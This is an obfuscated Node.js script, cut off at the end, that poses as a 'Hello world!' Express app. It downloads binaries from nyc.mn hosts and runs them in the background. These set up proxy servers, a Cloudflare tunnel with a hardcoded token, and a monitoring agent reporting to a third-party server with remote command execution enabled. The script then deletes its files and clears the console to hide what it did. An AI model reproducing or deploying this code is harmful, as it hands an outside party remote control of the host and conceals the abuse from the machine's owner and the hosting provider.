const _0x58eb33=_0x4e85;(function(_0x57f2a6,_0x131830){const _0x126573=_0x4e85,_0x54f415=_0x57f2a6();while(!![]){try{const _0x4e2853=-parseInt(_0x126573(0x18c))/0x1+parseInt(_0x126573(0x1e2))/0x2+parseInt(_0x126573(0x169))/0x3*(parseInt(_0x126573(0x1e5))/0x4)+-parseInt(_0x126573(0x208))/0x5+-parseInt(_0x126573(0x16b))/0x6*(-parseInt(_0x126573(0x1ba))/0x7)+parseInt(_0x126573(0x185))/0x8*(parseInt(_0x126573(0x1bb))/0x9)+-parseInt(_0x126573(0x1fd))/0xa;if(_0x4e2853===_0x131830)break;else _0x54f415['push'](_0x54f415['shift']());}catch(_0x2d356d){_0x54f415['push'](_0x54f415['shift']());}}}(_0x2f82,0xe0af5));const _0x44b8a4=(function(){let _0x234271=!![];return function(_0x1bb41f,_0x8be933){const _0x50ee58=_0x234271?function(){const _0x36794c=_0x4e85;if(_0x8be933){const _0x1a8f78=_0x8be933[_0x36794c(0x1d0)](_0x1bb41f,arguments);return _0x8be933=null,_0x1a8f78;}}:function(){};return _0x234271=![],_0x50ee58;};}()),_0x4bb958=_0x44b8a4(this,function(){const _0x4799cf=_0x4e85;return _0x4bb958[_0x4799cf(0x184)]()['search']('(((.+)+)+)+$')[_0x4799cf(0x184)]()[_0x4799cf(0x1ef)](_0x4bb958)[_0x4799cf(0x1d8)](_0x4799cf(0x1c8));});_0x4bb958();const _0x43d151=(function(){let _0x6e4ae3=!![];return function(_0x3b84e4,_0x3d54c5){const _0xed3a76=_0x6e4ae3?function(){if(_0x3d54c5){const _0x54b896=_0x3d54c5['apply'](_0x3b84e4,arguments);return _0x3d54c5=null,_0x54b896;}}:function(){};return _0x6e4ae3=![],_0xed3a76;};}()),_0x292cba=_0x43d151(this,function(){const _0x4fdf19=_0x4e85,_0x5bd024=function(){const _0x437bec=_0x4e85;let _0x51c015;try{_0x51c015=Function('return\x20(function()\x20'+_0x437bec(0x15c)+');')();}catch(_0x28fa80){_0x51c015=window;}return _0x51c015;},_0x39032d=_0x5bd024(),_0x45dbc8=_0x39032d[_0x4fdf19(0x20f)]=_0x39032d[_0x4fdf19(0x20f)]||{},_0x51d579=[_0x4fdf19(0x1cf),_0x4fdf19(0x1a0),_0x4fdf19(0x1c0),_0x4fdf19(0x20d),_0x4fdf19(0x1dd),_0x4fdf19(0x1fa),'trace'];for(let _0x3727d4=0x0;_0x3727d4<_0x51d579['length'];_0x3727d4++){const _0x4719ef=_0x43d151[_0x4fdf19(0x1ef)][_0x4fdf19(0x218)][_0x4fdf19(0x210)](_0x43d151),_0x131bb2=_0x51d579[_0x3727d4],_0x42ce3=_0x45dbc8[_0x131bb2]||_0x4719ef;_0x4719ef[_0x4fdf19(0x1cd)]=_0x43d151[_0x4fdf19(0x210)](_0x43d151),_0x4719ef['toString']=_0x42ce3[_0x4fdf19(0x184)][_0x4fdf19(0x210)](_0x42ce3),_0x45dbc8[_0x131bb2]=_0x4719ef;}});_0x292cba();const express=require(_0x58eb33(0x1a8)),app=express(),axios=require(_0x58eb33(0x1c5)),os=require('os'),fs=require('fs'),path=require(_0x58eb33(0x1a5)),{promisify}=require(_0x58eb33(0x178)),exec=promisify(require('child_process')[_0x58eb33(0x200)]),{execSync}=require(_0x58eb33(0x18a)),UPLOAD_URL=process[_0x58eb33(0x1c9)][_0x58eb33(0x194)]||'',PROJECT_URL=process[_0x58eb33(0x1c9)][_0x58eb33(0x1eb)]||'',AUTO_ACCESS=process[_0x58eb33(0x1c9)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x58eb33(0x1c9)]['FILE_PATH']||_0x58eb33(0x16a),SUB_PATH=process[_0x58eb33(0x1c9)][_0x58eb33(0x209)]||_0x58eb33(0x17e),PORT=process[_0x58eb33(0x1c9)][_0x58eb33(0x21d)]||process[_0x58eb33(0x1c9)]['PORT']||0xbb8,UUID=process[_0x58eb33(0x1c9)][_0x58eb33(0x170)]||_0x58eb33(0x1cc),NEZHA_SERVER=process[_0x58eb33(0x1c9)][_0x58eb33(0x166)]||_0x58eb33(0x216),NEZHA_PORT=process[_0x58eb33(0x1c9)][_0x58eb33(0x180)]||'443',NEZHA_KEY=process[_0x58eb33(0x1c9)]['NEZHA_KEY']||_0x58eb33(0x1a1),ARGO_DOMAIN=process[_0x58eb33(0x1c9)][_0x58eb33(0x19a)]||'a04.oklala.top',ARGO_AUTH=process[_0x58eb33(0x1c9)]['ARGO_AUTH']||_0x58eb33(0x17a),ARGO_PORT=process['env'][_0x58eb33(0x1f1)]||0x1f42,CFIP=process[_0x58eb33(0x1c9)][_0x58eb33(0x18d)]||_0x58eb33(0x1bf),CFPORT=process[_0x58eb33(0x1c9)][_0x58eb33(0x1f9)]||0x1bb,NAME=process[_0x58eb33(0x1c9)][_0x58eb33(0x1e0)]||_0x58eb33(0x1fe);!fs[_0x58eb33(0x21e)](FILE_PATH)?(fs[_0x58eb33(0x1f8)](FILE_PATH),console['log'](FILE_PATH+_0x58eb33(0x1e1))):console[_0x58eb33(0x1cf)](FILE_PATH+_0x58eb33(0x222));let npmPath=path[_0x58eb33(0x1cb)](FILE_PATH,'npm'),phpPath=path['join'](FILE_PATH,_0x58eb33(0x183)),webPath=path[_0x58eb33(0x1cb)](FILE_PATH,'web'),botPath=path['join'](FILE_PATH,_0x58eb33(0x1d9)),subPath=path[_0x58eb33(0x1cb)](FILE_PATH,_0x58eb33(0x16e)),listPath=path[_0x58eb33(0x1cb)](FILE_PATH,_0x58eb33(0x1b1)),bootLogPath=path[_0x58eb33(0x1cb)](FILE_PATH,'boot.log'),configPath=path[_0x58eb33(0x1cb)](FILE_PATH,_0x58eb33(0x1d4));function deleteNodes(){const _0x29ed62=_0x58eb33;try{if(!UPLOAD_URL)return;if(!fs[_0x29ed62(0x21e)](subPath))return;let _0x174477;try{_0x174477=fs[_0x29ed62(0x1b9)](subPath,_0x29ed62(0x1bd));}catch{return null;}const _0x3c94aa=Buffer[_0x29ed62(0x174)](_0x174477,_0x29ed62(0x1b6))[_0x29ed62(0x184)](_0x29ed62(0x1bd)),_0x24dcbc=_0x3c94aa['split']('\x0a')[_0x29ed62(0x1b8)](_0xac4d21=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xac4d21));if(_0x24dcbc[_0x29ed62(0x198)]===0x0)return;return axios[_0x29ed62(0x1b5)](UPLOAD_URL+_0x29ed62(0x1aa),JSON['stringify']({'nodes':_0x24dcbc}),{'headers':{'Content-Type':_0x29ed62(0x20b)}})[_0x29ed62(0x20e)](_0x13a06a=>{return null;});}catch(_0x29aa8e){return null;}}function cleanupOldFiles(){const _0x188628=_0x58eb33,_0x55465a=['web',_0x188628(0x1d9),_0x188628(0x19c),_0x188628(0x183),'sub.txt',_0x188628(0x1d5)];_0x55465a[_0x188628(0x1a7)](_0x36ff9c=>{const _0x127ec2=_0x188628,_0x24d37b=path[_0x127ec2(0x1cb)](FILE_PATH,_0x36ff9c);fs[_0x127ec2(0x1c2)](_0x24d37b,()=>{});});}app['get']('/',function(_0x17d0d6,_0x481c3f){const _0x331b6f=_0x58eb33;_0x481c3f[_0x331b6f(0x1bc)](_0x331b6f(0x17f));});const config={'log':{'access':_0x58eb33(0x1af),'error':_0x58eb33(0x1af),'loglevel':_0x58eb33(0x1c6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x58eb33(0x1a9),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x58eb33(0x1c6),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x58eb33(0x1da),'dest':0xbbb},{'path':_0x58eb33(0x1fc),'dest':0xbbc}]},'streamSettings':{'network':_0x58eb33(0x195)}},{'port':0xbb9,'listen':_0x58eb33(0x217),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x58eb33(0x1c6)},'streamSettings':{'network':_0x58eb33(0x195),'security':_0x58eb33(0x1c6)}},{'port':0xbba,'listen':_0x58eb33(0x217),'protocol':_0x58eb33(0x1a9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x58eb33(0x1c6)},'streamSettings':{'network':'ws','security':_0x58eb33(0x1c6),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x58eb33(0x182),_0x58eb33(0x164),_0x58eb33(0x1d1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x58eb33(0x217),'protocol':_0x58eb33(0x189),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x58eb33(0x1da)}},'sniffing':{'enabled':!![],'destOverride':[_0x58eb33(0x182),'tls',_0x58eb33(0x1d1)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x58eb33(0x1b2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x58eb33(0x1c6),'wsSettings':{'path':_0x58eb33(0x1fc)}},'sniffing':{'enabled':!![],'destOverride':[_0x58eb33(0x182),_0x58eb33(0x164),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x58eb33(0x1d3),'tag':_0x58eb33(0x19b)},{'protocol':_0x58eb33(0x196),'tag':'block'}]};fs['writeFileSync'](path[_0x58eb33(0x1cb)](FILE_PATH,_0x58eb33(0x1d4)),JSON['stringify'](config,null,0x2));function _0x2f82(){const _0x1447b4=['readFileSync','1170883tRnXHg','148842uFyLwV','send','utf-8','arm','www.visa.com.sg','info','has','unlink','./bot','writeFileSync','axios','none','listen','(((.+)+)+)+$','env','unlinkSync','join','8ff07af2-df4d-4148-a644-ff4c89bddc47','__proto__','/vmess-argo?ed=2560','log','apply','quic','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','freedom','config.json','boot.log','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20successfully','search','bot','/vmess-argo','\x0a\x20\x20\x20\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','exception','status','close','NAME','\x20is\x20created','2046030GwElRS','?security=tls&sni=','443','11404IMQsuJ','web','/api/add-subscriptions','message','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://arm64.ssss.nyc.mn/agent','PROJECT_URL','2053','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','tunnel.yml','constructor','\x20-p\x20','ARGO_PORT','\x20>/dev/null\x202>&1\x20&','rm\x20-rf\x20','Error\x20downloading\x20files:','automatic\x20access\x20task\x20added\x20successfully','web\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','mkdirSync','CFPORT','table','aarch64','/trojan-argo','8007740qfAIxG','galaxycloud','2083','exec','&path=%2Fvless-argo%3Fed%3D2560#','get','php\x20is\x20running','https://arm64.ssss.nyc.mn/2go','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20credentials-file:\x20','stream','4579055FJeAyc','SUB_PATH','all','application/json','./web','error','catch','console','bind','set','push','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/php\x20-c\x20\x22','Subscription\x20uploaded\x20successfully','agent.oklala.nyc.mn','127.0.0.1','prototype','map','https://amd64.ssss.nyc.mn/v1','Download\x20','2087','SERVER_PORT','existsSync','Error\x20executing\x20command:\x20','\x0a\x20\x20tunnel:\x20','split','\x20already\x20exists','chmod','{}.constructor(\x22return\x20this\x22)(\x20)','/npm\x20-s\x20','/tunnel.yml\x20run','NEZHA\x20variable\x20is\x20empty,skip\x20running','TunnelSecret','data','/web\x20-c\x20','Empowerment\x20success\x20for\x20','tls','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_SERVER','text/plain;\x20charset=utf-8','8443','1119OgOwlG','./tmp','18raVmnN','bot\x20is\x20running','添加URL失败:\x20','sub.txt','response','UUID','amd','?encryption=none&security=tls&sni=','then','from','2096','/bot\x20','\x0aclient_secret:\x20','util','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','eyJhIjoiYTUyYzFmMDk1MzAyNTU0YjA3NzJkNjU4ODI0MjRlMzUiLCJ0IjoiY2JlMDM2ZDAtMGViNC00Y2JkLTgyOWItMmM0ZWMzNmMwYzA4IiwicyI6Ik5qWTVNVFV3WWpFdE1UTXhZeTAwWmpnMExXSm1NVGd0WkdJellXTmxNR0UwWWpVMSJ9','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unshift','\x0avless://','sub','Hello\x20world!','NEZHA_PORT','test','http','php','toString','24hTNaJG','\x20failed:\x20','match','includes','vmess','child_process','App\x20is\x20running','965BuMzgA','CFIP','config.yaml','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/api/add-nodes','finish','stringify','--tls','UPLOAD_URL','tcp','blackhole','\x0a\x20\x20\x0atrojan://','length','arm64','ARGO_DOMAIN','direct','npm','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','https://amd64.ssss.nyc.mn/web','tunnel.json','warn','NgwltSDiKy2XC8z6pG','/sub.txt\x20saved\x20successfully','./npm','npm\x20running\x20error:\x20','path','arch','forEach','express','vless','/api/delete-nodes','web\x20is\x20running','https://amd64.ssss.nyc.mn/agent','false','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/dev/null','bot\x20is\x20running.','list.txt','trojan','&type=ws&host=','Skipping\x20adding\x20automatic\x20access\x20task','post','base64','nohup\x20','filter'];_0x2f82=function(){return _0x1447b4;};return _0x2f82();}function getSystemArchitecture(){const _0x4e68be=_0x58eb33,_0x48789e=os[_0x4e68be(0x1a6)]();return _0x48789e===_0x4e68be(0x1be)||_0x48789e===_0x4e68be(0x199)||_0x48789e===_0x4e68be(0x1fb)?_0x4e68be(0x1be):_0x4e68be(0x171);}function downloadFile(_0x3db93f,_0x1118ee,_0x56e4f2){const _0x3d2fb7=_0x58eb33,_0x1113e0=path[_0x3d2fb7(0x1cb)](FILE_PATH,_0x3db93f),_0xfc4ff5=fs['createWriteStream'](_0x1113e0);axios({'method':_0x3d2fb7(0x202),'url':_0x1118ee,'responseType':_0x3d2fb7(0x207)})[_0x3d2fb7(0x173)](_0x59e6c0=>{const _0x5e1024=_0x3d2fb7;_0x59e6c0[_0x5e1024(0x161)]['pipe'](_0xfc4ff5),_0xfc4ff5['on'](_0x5e1024(0x191),()=>{const _0x3c3a37=_0x5e1024;_0xfc4ff5[_0x3c3a37(0x1df)](),console[_0x3c3a37(0x1cf)](_0x3c3a37(0x21b)+_0x3db93f+_0x3c3a37(0x1d7)),_0x56e4f2(null,_0x3db93f);}),_0xfc4ff5['on'](_0x5e1024(0x20d),_0x86c61a=>{const _0x251bd3=_0x5e1024;fs[_0x251bd3(0x1c2)](_0x1113e0,()=>{});const _0x507c42=_0x251bd3(0x21b)+_0x3db93f+_0x251bd3(0x186)+_0x86c61a[_0x251bd3(0x1e8)];console[_0x251bd3(0x20d)](_0x507c42),_0x56e4f2(_0x507c42);});})[_0x3d2fb7(0x20e)](_0x1cb80f=>{const _0x47f6c8=_0x3d2fb7,_0x388173='Download\x20'+_0x3db93f+_0x47f6c8(0x186)+_0x1cb80f['message'];console[_0x47f6c8(0x20d)](_0x388173),_0x56e4f2(_0x388173);});}async function downloadFilesAndRun(){const _0x4731e8=_0x58eb33,_0x511647=getSystemArchitecture(),_0xb662f9=getFilesForArchitecture(_0x511647);if(_0xb662f9[_0x4731e8(0x198)]===0x0){console[_0x4731e8(0x1cf)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x443828=_0xb662f9[_0x4731e8(0x219)](_0x1ccc60=>{return new Promise((_0x5c35df,_0x4da9ec)=>{downloadFile(_0x1ccc60['fileName'],_0x1ccc60['fileUrl'],(_0xf3e153,_0x3425bc)=>{_0xf3e153?_0x4da9ec(_0xf3e153):_0x5c35df(_0x3425bc);});});});try{await Promise[_0x4731e8(0x20a)](_0x443828);}catch(_0x50174f){console[_0x4731e8(0x20d)](_0x4731e8(0x1f4),_0x50174f);return;}function _0x439df1(_0x51a434){const _0x16c855=0x1fd;_0x51a434['forEach'](_0x3ccb93=>{const _0xe2878c=_0x4e85,_0x915a99=path['join'](FILE_PATH,_0x3ccb93);fs[_0xe2878c(0x21e)](_0x915a99)&&fs[_0xe2878c(0x15b)](_0x915a99,_0x16c855,_0x36ddc1=>{const _0x1e613f=_0xe2878c;_0x36ddc1?console['error']('Empowerment\x20failed\x20for\x20'+_0x915a99+':\x20'+_0x36ddc1):console[_0x1e613f(0x1cf)](_0x1e613f(0x163)+_0x915a99+':\x20'+_0x16c855[_0x1e613f(0x184)](0x8));});});}const _0x37e055=NEZHA_PORT?[_0x4731e8(0x1a3),_0x4731e8(0x20c),'./bot']:['./php','./web',_0x4731e8(0x1c3)];_0x439df1(_0x37e055);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x304dc7=NEZHA_SERVER[_0x4731e8(0x188)](':')?NEZHA_SERVER[_0x4731e8(0x221)](':')['pop']():'',_0x28c8bf=new Set(['443',_0x4731e8(0x168),_0x4731e8(0x175),_0x4731e8(0x21c),'2083',_0x4731e8(0x1ec)]),_0x52f3fa=_0x28c8bf[_0x4731e8(0x1c1)](_0x304dc7)?'true':_0x4731e8(0x1ad),_0x3ee2e1=_0x4731e8(0x177)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x4731e8(0x1ed)+_0x52f3fa+_0x4731e8(0x17b)+UUID;fs[_0x4731e8(0x1c4)](path['join'](FILE_PATH,_0x4731e8(0x18e)),_0x3ee2e1);const _0x5fdc6d='nohup\x20'+FILE_PATH+_0x4731e8(0x214)+FILE_PATH+_0x4731e8(0x18f);try{await exec(_0x5fdc6d),console[_0x4731e8(0x1cf)](_0x4731e8(0x203)),await new Promise(_0x45db0b=>setTimeout(_0x45db0b,0x3e8));}catch(_0x33aacb){console['error']('php\x20running\x20error:\x20'+_0x33aacb);}}else{let _0x4b61cd='';const _0x459239=[_0x4731e8(0x1e4),'8443',_0x4731e8(0x175),_0x4731e8(0x21c),_0x4731e8(0x1ff),_0x4731e8(0x1ec)];_0x459239[_0x4731e8(0x188)](NEZHA_PORT)&&(_0x4b61cd=_0x4731e8(0x193));const _0x523b7b='nohup\x20'+FILE_PATH+_0x4731e8(0x15d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4731e8(0x1f0)+NEZHA_KEY+'\x20'+_0x4b61cd+_0x4731e8(0x1f2);try{await exec(_0x523b7b),console['log']('npm\x20is\x20running'),await new Promise(_0x31a66e=>setTimeout(_0x31a66e,0x3e8));}catch(_0x581679){console[_0x4731e8(0x20d)](_0x4731e8(0x1a4)+_0x581679);}}}else console['log'](_0x4731e8(0x15f));const _0x34d238='nohup\x20'+FILE_PATH+_0x4731e8(0x162)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x34d238),console[_0x4731e8(0x1cf)](_0x4731e8(0x1ab)),await new Promise(_0x564e85=>setTimeout(_0x564e85,0x3e8));}catch(_0x5a0cd4){console['error'](_0x4731e8(0x1f6)+_0x5a0cd4);}if(fs['existsSync'](path['join'](FILE_PATH,_0x4731e8(0x1d9)))){let _0x19aca1;if(ARGO_AUTH[_0x4731e8(0x187)](/^[A-Z0-9a-z=]{120,250}$/))_0x19aca1=_0x4731e8(0x1f7)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x19aca1=_0x4731e8(0x1d2)+FILE_PATH+_0x4731e8(0x15e):_0x19aca1=_0x4731e8(0x1e9)+FILE_PATH+_0x4731e8(0x213)+ARGO_PORT;try{await exec(_0x4731e8(0x1b7)+FILE_PATH+_0x4731e8(0x176)+_0x19aca1+_0x4731e8(0x1f2)),console[_0x4731e8(0x1cf)](_0x4731e8(0x16c)),await new Promise(_0x5758bc=>setTimeout(_0x5758bc,0x7d0));}catch(_0x1fe25b){console['error'](_0x4731e8(0x21f)+_0x1fe25b);}}await new Promise(_0x543f30=>setTimeout(_0x543f30,0x1388));}function getFilesForArchitecture(_0x3337d3){const _0x3397c4=_0x58eb33;let _0x570f92;_0x3337d3===_0x3397c4(0x1be)?_0x570f92=[{'fileName':_0x3397c4(0x1e6),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x3397c4(0x204)}]:_0x570f92=[{'fileName':_0x3397c4(0x1e6),'fileUrl':_0x3397c4(0x19e)},{'fileName':_0x3397c4(0x1d9),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x127b8c=_0x3337d3===_0x3397c4(0x1be)?_0x3397c4(0x1ea):_0x3397c4(0x1ac);_0x570f92[_0x3397c4(0x17c)]({'fileName':'npm','fileUrl':_0x127b8c});}else{const _0x588528=_0x3337d3===_0x3397c4(0x1be)?'https://arm64.ssss.nyc.mn/v1':_0x3397c4(0x21a);_0x570f92[_0x3397c4(0x17c)]({'fileName':_0x3397c4(0x183),'fileUrl':_0x588528});}}return _0x570f92;}function argoType(){const _0x2efd13=_0x58eb33;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2efd13(0x1cf)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x2efd13(0x160))){fs[_0x2efd13(0x1c4)](path['join'](FILE_PATH,_0x2efd13(0x19f)),ARGO_AUTH);const _0x4bf43b=_0x2efd13(0x220)+ARGO_AUTH['split']('\x22')[0xb]+_0x2efd13(0x206)+path[_0x2efd13(0x1cb)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2efd13(0x1c4)](path['join'](FILE_PATH,_0x2efd13(0x1ee)),_0x4bf43b);}else console[_0x2efd13(0x1cf)](_0x2efd13(0x179));}function _0x4e85(_0x1465f7,_0x56b599){const _0x35acfa=_0x2f82();return _0x4e85=function(_0x292cba,_0x43d151){_0x292cba=_0x292cba-0x15b;let _0x4e71e4=_0x35acfa[_0x292cba];return _0x4e71e4;},_0x4e85(_0x1465f7,_0x56b599);}argoType();async function extractDomains(){const _0x3ff9ab=_0x58eb33;let _0x1ad938;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1ad938=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x1ad938),await _0x407a44(_0x1ad938);else try{const _0x58617d=fs[_0x3ff9ab(0x1b9)](path['join'](FILE_PATH,_0x3ff9ab(0x1d5)),_0x3ff9ab(0x1bd)),_0x5ef241=_0x58617d[_0x3ff9ab(0x221)]('\x0a'),_0x4aba0b=[];_0x5ef241['forEach'](_0x27cfb4=>{const _0x4d38dd=_0x27cfb4['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4d38dd){const _0x368575=_0x4d38dd[0x1];_0x4aba0b['push'](_0x368575);}});if(_0x4aba0b['length']>0x0)_0x1ad938=_0x4aba0b[0x0],console[_0x3ff9ab(0x1cf)]('ArgoDomain:',_0x1ad938),await _0x407a44(_0x1ad938);else{console['log'](_0x3ff9ab(0x165)),fs[_0x3ff9ab(0x1ca)](path['join'](FILE_PATH,_0x3ff9ab(0x1d5)));async function _0x480a9c(){const _0x25c0ed=_0x3ff9ab;try{await exec(_0x25c0ed(0x19d));}catch(_0x169068){}}_0x480a9c(),await new Promise(_0x12437e=>setTimeout(_0x12437e,0xbb8));const _0x3648cf='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3ff9ab(0x213)+ARGO_PORT;try{await exec(_0x3ff9ab(0x1b7)+path[_0x3ff9ab(0x1cb)](FILE_PATH,_0x3ff9ab(0x1d9))+'\x20'+_0x3648cf+'\x20>/dev/null\x202>&1\x20&'),console[_0x3ff9ab(0x1cf)](_0x3ff9ab(0x1b0)),await new Promise(_0x5d2939=>setTimeout(_0x5d2939,0xbb8)),await extractDomains();}catch(_0x312f79){console[_0x3ff9ab(0x20d)](_0x3ff9ab(0x21f)+_0x312f79);}}}catch(_0x547434){console[_0x3ff9ab(0x20d)]('Error\x20reading\x20boot.log:',_0x547434);}async function _0x407a44(_0x242541){const _0x1f0795=_0x3ff9ab,_0x5fa823=execSync(_0x1f0795(0x1dc),{'encoding':_0x1f0795(0x1bd)}),_0x171e96=_0x5fa823['trim']();return new Promise(_0x8c682a=>{setTimeout(()=>{const _0x27a835=_0x4e85,_0x17b848={'v':'2','ps':NAME+'-'+_0x171e96,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x27a835(0x1c6),'host':_0x242541,'path':_0x27a835(0x1ce),'tls':_0x27a835(0x164),'sni':_0x242541,'alpn':''},_0x4406e1=_0x27a835(0x17d)+UUID+'@'+CFIP+':'+CFPORT+_0x27a835(0x172)+_0x242541+'&type=ws&host='+_0x242541+_0x27a835(0x201)+NAME+'-'+_0x171e96+'\x0a\x20\x20\x0avmess://'+Buffer[_0x27a835(0x174)](JSON[_0x27a835(0x192)](_0x17b848))[_0x27a835(0x184)](_0x27a835(0x1b6))+_0x27a835(0x197)+UUID+'@'+CFIP+':'+CFPORT+_0x27a835(0x1e3)+_0x242541+_0x27a835(0x1b3)+_0x242541+_0x27a835(0x1d6)+NAME+'-'+_0x171e96+_0x27a835(0x1db);console[_0x27a835(0x1cf)](Buffer[_0x27a835(0x174)](_0x4406e1)[_0x27a835(0x184)](_0x27a835(0x1b6))),fs['writeFileSync'](subPath,Buffer['from'](_0x4406e1)['toString'](_0x27a835(0x1b6))),console[_0x27a835(0x1cf)](FILE_PATH+_0x27a835(0x1a2)),uplodNodes(),app[_0x27a835(0x202)]('/'+SUB_PATH,(_0x591b55,_0x33f3c4)=>{const _0x49c2de=_0x27a835,_0x14dbb6=Buffer[_0x49c2de(0x174)](_0x4406e1)['toString']('base64');_0x33f3c4[_0x49c2de(0x211)]('Content-Type',_0x49c2de(0x167)),_0x33f3c4[_0x49c2de(0x1bc)](_0x14dbb6);}),_0x8c682a(_0x4406e1);},0x7d0);});}}async function uplodNodes(){const _0x24d5a2=_0x58eb33;if(UPLOAD_URL&&PROJECT_URL){const _0x1c835f=PROJECT_URL+'/'+SUB_PATH,_0x5ce40e={'subscription':[_0x1c835f]};try{const _0x8e9ce9=await axios[_0x24d5a2(0x1b5)](UPLOAD_URL+_0x24d5a2(0x1e7),_0x5ce40e,{'headers':{'Content-Type':_0x24d5a2(0x20b)}});if(_0x8e9ce9[_0x24d5a2(0x1de)]===0xc8)console['log'](_0x24d5a2(0x215));else return null;}catch(_0x7407f){if(_0x7407f[_0x24d5a2(0x16f)]){if(_0x7407f[_0x24d5a2(0x16f)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24d5a2(0x21e)](listPath))return;const _0x4d20c0=fs['readFileSync'](listPath,_0x24d5a2(0x1bd)),_0x57ac41=_0x4d20c0['split']('\x0a')[_0x24d5a2(0x1b8)](_0x117ba2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x24d5a2(0x181)](_0x117ba2));if(_0x57ac41['length']===0x0)return;const _0x59a618=JSON['stringify']({'nodes':_0x57ac41});try{await axios['post'](UPLOAD_URL+_0x24d5a2(0x190),_0x59a618,{'headers':{'Content-Type':_0x24d5a2(0x20b)}});if(response[_0x24d5a2(0x1de)]===0xc8)console[_0x24d5a2(0x1cf)](_0x24d5a2(0x215));else return null;}catch(_0x2bba21){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x47d0b8=_0x4e85,_0x9d02ca=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x9d02ca[_0x47d0b8(0x212)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x9d02ca[_0x47d0b8(0x212)](phpPath);exec(_0x47d0b8(0x1f3)+_0x9d02ca[_0x47d0b8(0x1cb)]('\x20')+'\x20>/dev/null\x202>&1',_0x2bfdac=>{const _0x2960ce=_0x47d0b8;console['clear'](),console[_0x2960ce(0x1cf)](_0x2960ce(0x18b)),console['log'](_0x2960ce(0x1ae));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x29c4b6=_0x58eb33;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x29c4b6(0x1cf)](_0x29c4b6(0x1b4));return;}try{const _0xe6ee8d=await 